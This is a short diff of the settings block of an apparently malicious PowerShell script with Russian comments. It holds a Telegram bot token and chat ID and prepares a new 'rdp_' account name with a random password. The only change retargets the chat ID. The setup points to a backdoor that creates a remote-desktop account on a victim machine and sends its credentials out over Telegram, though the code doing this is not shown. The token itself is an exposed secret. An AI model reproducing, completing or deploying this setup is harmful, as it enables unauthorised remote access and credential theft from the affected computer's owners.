@@ -1,6 +1,6 @@
 # ===== НАСТРОЙКИ =====
 $Token = '5466273638:AAF5XEp-3IIgjsgOlV2YauFeSnBlAZeFe5M'
-$ChatID = '5336452267'
+$ChatID = '5336455555'
 $NewUser = ("rdp_" + $env:COMPUTERNAME).ToLower() -replace '[^a-z0-9_]', ''
 $NewPass = -join ((33..126) | Get-Random -Count 16 | ForEach-Object {[char]$_})
 # =====================
